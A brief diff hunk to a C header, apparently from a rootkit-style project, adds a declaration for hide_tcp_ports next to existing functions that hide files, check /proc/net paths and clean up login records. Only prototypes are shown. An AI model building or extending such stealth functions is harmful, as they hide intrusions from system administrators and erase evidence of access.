@@ -38,6 +38,9 @@ int         is_hidden_file(const char *path);
 /* is_procnet.c */
 int         is_procnet(const char *path);
 
+/* hide_tcp_ports  */
+FILE        *hide_tcp_ports(const char *file);
+
 /* cleanup_login_records.c */
 void        cleanup_login_records(const char *pty_name);
 
